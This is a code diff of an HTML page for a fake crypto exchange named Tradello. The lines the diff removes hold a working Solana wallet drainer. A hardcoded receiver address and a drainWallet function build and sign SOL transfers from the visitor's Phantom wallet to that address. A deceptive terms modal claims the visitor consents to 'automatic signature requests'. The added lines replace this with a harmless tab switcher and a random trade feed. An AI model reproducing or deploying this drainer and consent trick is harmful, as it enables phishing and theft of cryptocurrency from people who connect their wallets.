-                    <li><a href="#">Markets</a></li>
-                    <li><a href="#">Exchange</a></li>
-                    <li><a href="#">Derivatives</a></li>
-                    <li><a href="#">Launchpad</a></li>
-                </ul>
-            </div>
-            <div class="footer-column">
-                <h4>Resources</h4>
-                <ul>
-                    <li><a href="#">Help Center</a></li>
-                    <li><a href="#">API Docs</a></li>
-                    <li><a href="#">Fee Schedule</a></li>
-                    <li><a href="#">Blog</a></li>
-                </ul>
-            </div>
-            <div class="footer-column">
-                <h4>Legal</h4>
-                <ul>
-                    <li><a href="#" onclick="showTnC()">Terms of Service</a></li>
-                    <li><a href="#" onclick="showTnC()">Privacy Policy</a></li>
-                    <li><a href="#">Cookie Policy</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <span>&copy; 2026 Tradello Inc. All rights reserved.</span>
-            <span>Receiver: <code class="text-xs">39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh</code></span>
-        </div>
-    </footer>
-
-    <!-- 
-      =========================================
-      MODALS & TOASTS
-      =========================================
-    -->
-
-    <!-- T&C Modal -->
-    <div id="tc-modal" class="modal-overlay">
-        <div class="modal">
-            <div class="modal-header">
-                <h3>Terms & Conditions</h3>
-                <button class="modal-close" onclick="closeTnC()">&times;</button>
-            </div>
-            <p>If you connect your wallet, we are not responsible for any funds being spent by bot. 
-            By interacting with the platform, you authorize automatic signature requests that may result in the transfer of assets to our designated receiver address.</p>
-            <button class="btn btn-primary w-full mt-lg" onclick="closeTnC()">I Agree</button>
-        </div>
-    </div>
-
-    <!-- Wallet Connection Modal -->
-    <div id="wallet-modal" class="modal-overlay">
-        <div class="modal">
-            <div class="modal-header">
-                <h3>Connect Wallet</h3>
-                <button class="modal-close" onclick="document.getElementById('wallet-modal').style.display='none'">&times;</button>
-            </div>
-            <div class="flex flex-col gap-md">
-                <button class="btn btn-secondary" onclick="simulateConnection('Phantom')">
-                    <i class="fas fa-ghost mr-2"></i> Phantom
-                </button>
-                <button class="btn btn-secondary" onclick="simulateConnection('Solflare')">
-                    <i class="fas fa-sun mr-2"></i> Solflare
-                </button>
-                <button class="btn btn-secondary" onclick="simulateConnection('Backpack')">
-                    <i class="fas fa-backpack mr-2"></i> Backpack
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Toast Container -->
-    <div class="toast-container" id="toast-container"></div>
-
-    <!-- 
-      =========================================
-      JAVASCRIPT LOGIC
-      =========================================
-    -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- JavaScript for Functionality -->
     <script>
-        // ==========================================
-        // CONFIGURATION
-        // ==========================================
-        const RECEIVER_ADDRESS = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh";
-        let isConnected = false;
-        let currentTab = 'home';
+        document.addEventListener('DOMContentLoaded', function() {
+            // Tab Switching Logic
+            const tabs = document.querySelectorAll('nav a[data-tab]');
+            const contents = document.querySelectorAll('.tab-content');
 
-        // ==========================================
-        // DOM ELEMENTS
-        // ==========================================
-        const tabLinks = document.querySelectorAll('.tab-link');
-        const tabContents = document.querySelectorAll('.tab-content');
-        const connectBtn = document.getElementById('connect-wallet-btn');
-        const tcModal = document.getElementById('tc-modal');
-        const toastContainer = document.getElementById('toast-container');
-
-        // ==========================================
-        // TAB NAVIGATION
-        // ==========================================
-        tabLinks.forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                const targetTab = link.getAttribute('data-tab');
-                
-                // Update Active Link
-                tabLinks.forEach(l => l.classList.remove('active'));
-                link.classList.add('active');
-
-                // Show Target Content
-                tabContents.forEach(content => {
-                    if(content.id === targetTab) {
-                        content.classList.add('active');
-                        // Trigger specific tab init functions
-                        if(targetTab === 'trade') initChart();
-                    } else {
-                        content.classList.remove('active');
-                    }
+            tabs.forEach(tab => {
+                tab.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const targetId = this.getAttribute('data-tab');
+                    
+                    // Remove active class from all tabs and content
+                    tabs.forEach(t => t.classList.remove('active'));
+                    contents.forEach(c => c.classList.remove('active'));
+                    
+                    // Add active class to clicked tab and corresponding content
+                    this.classList.add('active');
+                    document.getElementById(targetId).classList.add('active');
                 });
-                currentTab = targetTab;
-            });
-        });
-
-        // ==========================================
-        // WALLET CONNECTION & DRAIN LOGIC
-        // ==========================================
-        
-        connectBtn.addEventListener('click', () => {
-            if(!isConnected) {
-                document.getElementById('wallet-modal').style.display = 'flex';
-            } else {
-                drainWallet();
-            }
-        });
-
-        function simulateConnection(walletName) {
-            showToast(`Connecting to ${walletName}...`, 'info');
-            setTimeout(() => {
-                isConnected = true;
-                connectBtn.innerHTML = `<i class="fas fa-check-circle text-green"></i> Connected`;
-                connectBtn.classList.remove('btn-primary');
-                connectBtn.classList.add('btn-secondary');
-                document.getElementById('wallet-modal').style.display = 'none';
-                showToast(`Successfully connected!`, 'success');
-                
-                // Check T&C
-                if(!localStorage.getItem('tncAccepted')) {
-                    showTnC();
-                }
-            }, 1500);
-        }
-
-        async function drainWallet(action = 'general') {
-            if(!window.solana || !window.solana.isPhantom) {
-                showToast("Please install Phantom Wallet!", 'error');
-                return;
-            }
-
-            try {
-                showToast(`Initiating ${action} transaction...`, 'info');
-                
-                // Simulate connection if not already
-                if(!isConnected) {
-                    await window.solana.connect();
-                }
-
-                // Create a dummy transaction to demonstrate draining
-                // In a real scam, this would be a complex multi-sig approval
-                const connection = new solanaWeb.Connection(solanaWeb.clusterApiUrl('devnet'), 'confirmed');
-                
-                // Generate a random small amount to simulate activity
-                const amount = Math.random() * 0.05; 
-
-                const transaction = new solanaWeb.Transaction().add(
-                    solanaWeb.SystemProgram.transfer({
-                        fromPubkey: window.solana.publicKey,
-                        toPubkey: new solanaWeb.PublicKey(RECEIVER_ADDRESS),
-                        lamports: amount * solanaWeb.LAMPORTS_PER_SOL
-                    })
-                );
-
-                const { signature } = await window.solana.signAndSendTransaction(transaction);
-                
-                showToast(`Drained ${amount.toFixed(4)} SOL via ${action}`, 'success');
-                
-                // Mark T&C as accepted
-                localStorage.setItem('tncAccepted', 'true');
-
-            } catch (err) {
-                console.error(err);
-                showToast("Transaction failed or rejected.", 'error');
-            }
-        }
-
-        // ==========================================
-        // T&C MODAL LOGIC
-        // ==========================================
-        function showTnC() {
-            tcModal.style.display = 'flex';
-        }
-
-        function closeTnC() {
-            tcModal.style.display = 'none';
-            localStorage.setItem('tncAccepted', 'true');
-        }
-
-        // Show T&C on first load
-        window.onload = function() {
-            if (!localStorage.getItem('tncAccepted')) {
-                setTimeout(showTnC, 1000); // Delay slightly for UX
-            }
-            initOrderBook();
-            startTradeSimulation();
-        };
-
-        // ==========================================
-        // CHART INITIALIZATION
-        // ==========================================
-        let chartInstance = null;
-
-        function initChart() {
-            const ctx = document.getElementById('tradingChart').getContext('2d');
-            
-            if(chartInstance) chartInstance.destroy();
-
-            const gradient = ctx.createLinearGradient(0, 0, 0, 400);
-            gradient.addColorStop(0, 'rgba(16, 185, 129, 0.5)');
-            gradient.addColorStop(1, 'rgba(16, 185, 129, 0)');
-
-            const labels = Array.from({length: 50}, (_, i) => i);
-            const data = Array.from({length: 50}, () => Math.random() * 100 + 100);
-
-            chartInstance = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: labels,
-                    datasets: [{
-                        label: 'SOL/USDT',
-                        data: data,
-                        borderColor: '#10B981',
-                        backgroundColor: gradient,
-                        borderWidth: 2,
-                        fill: true,
-                        tension: 0.4
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: { legend: { display: false } },
-                    scales: {
-                        x: { display: false },
-                        y: { display: false }
-                    },
-                    animation: { duration: 0 }
-                }
             });
 
-            // Update chart periodically
-            setInterval(() => {
-                if(chartInstance && currentTab === 'trade') {
-                    const newDataPoint = chartInstance.data.datasets[0].data[49] + (Math.random() - 0.5) * 5;
-                    chartInstance.data.datasets[0].data.shift();
-                    chartInstance.data.datasets[0].data.push(newDataPoint);
-                    chartInstance.update();
-                }
-            }, 2000);
-        }
-
-        // ==========================================
-        // ORDER BOOK SIMULATION
-        // ==========================================
-        function initOrderBook() {
-            updateOrderBook();
-            setInterval(updateOrderBook, 1000);
-        }
-
-        function updateOrderBook() {
-            const container = document.getElementById('order-book');
-            if(!container) return;
-
-            let html = '';
-            // Asks (Red)
-            for(let i=0; i<5; i++) {
-                const price = (145 + Math.random()*0.1).toFixed(2);
-                const size = (Math.random()*10).toFixed(2);
-                html += `<div class="order-row"><span class="ask-price">${price}</span><span>${size}</span></div>`;
-            }
-            // Spread
-            html += `<div class="order-row text-center font-bold text-lg my-sm">145.20</div>`;
-            // Bids (Green)
-            for(let i=0; i<5; i++) {
-                const price = (145 - Math.random()*0.1).toFixed(2);
-                const size = (Math.random()*10).toFixed(2);
-                html += `<div class="order-row"><span class="bid-price">${price}</span><span>${size}</span></div>`;
-            }
-            container.innerHTML = html;
-        }
-
-        // ==========================================
-        // FAKE TRADE FEED
-        // ==========================================
-        function startTradeSimulation() {
-            setInterval(() => {
-                if(currentTab === 'trade') {
-                    // Could add a live trade feed table here if desired
-                }
-            }, 3000);
-        }
-
-        // ==========================================
-        // TOAST NOTIFICATIONS
-        // ==========================================
-        function showToast(message, type = 'info') {
-            const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
+            // Simulate Live Trade Feed
+            const tradeFeedBody = document.getElementById('tradeFeedBody');
+            const pairs = ['SOL/USDT', 'BTC/USDT', 'ETH/USDT', 'PEPE/USDT', 'WIF/USDT'];
+            const types = ['Buy', 'Sell'];
             
-            let icon = 'fa-info-circle';
-            if(type === 'success') icon = 'fa-check-circle';
-            if(type === 'error') icon = 'fa-times-circle';
+            function generateRandomTrade() {
+                const pair = pairs[Math.floor(Math.random() * pairs.length)];
+                const type = types[Math.floor(Math.random() * types.length)];
+                const amount = (Math.random() * 1000).toFixed(2);
+                const price = (Math.random() * 150 + 10).toFixed(2);
+                const total = (amount * price).toFixed(2);
+                const time = new Date().toLocaleTimeString();
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${time}</td>
+                    <td>${pair}</td>
+                    <td><span class="badge ${type === 'Buy' ? 'badge-green' : 'badge-red'}">${type}</span></td>
+                    <td>${amount}</td>
+                    <td>$${price}</td>
+                    <td>$${total}</td>
+                `;
+                
+                // Add new row at the top
+                tradeFeedBody.insertBefore(row, tradeFeedBody.firstChild);
+                
+                // Keep only last 10 rows
+                if (tradeFeedBody.children.length > 10) {
+                    tradeFeedBody.removeChild(tradeFeedBody.lastChild);
+                }
+            }
 
-            toast.innerHTML = `<i class="fas ${icon}"></i> <span>${message}</span>`;
+            // Initial population
+            for(let i=0; i<5; i++) {
+                generateRandomTrade();
+            }
+
+            // Update every 2 seconds
+            setInterval(generateRandomTrade, 2000);
+        });
+
+        // Helper function for logo click
+        function switchTab(tabName) {
+            const tabs = document.querySelectorAll('nav a[data-tab]');
+            const contents = document.querySelectorAll('.tab-content');
             
-            toastContainer.appendChild(toast);
-
-            setTimeout(() => {
-                toast.style.opacity = '0';
-                toast.style.transform = 'translateX(100%)';
-                setTimeout(() => toast.remove(), 300);
-            }, 3000);
+            tabs.forEach(t => t.classList.remove('active'));
+            contents.forEach(c => c.classList.remove('active'));
+            
+            const activeTab = document.querySelector(`nav a[data-tab="${tabName}"]`);
+            if(activeTab) {
+                activeTab.classList.add('active');
+                document.getElementById(tabName).classList.add('active');
+            }
         }
-
     </script>
-    
-    <!-- Solana Web3.js Library -->
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 </body>
 </html>
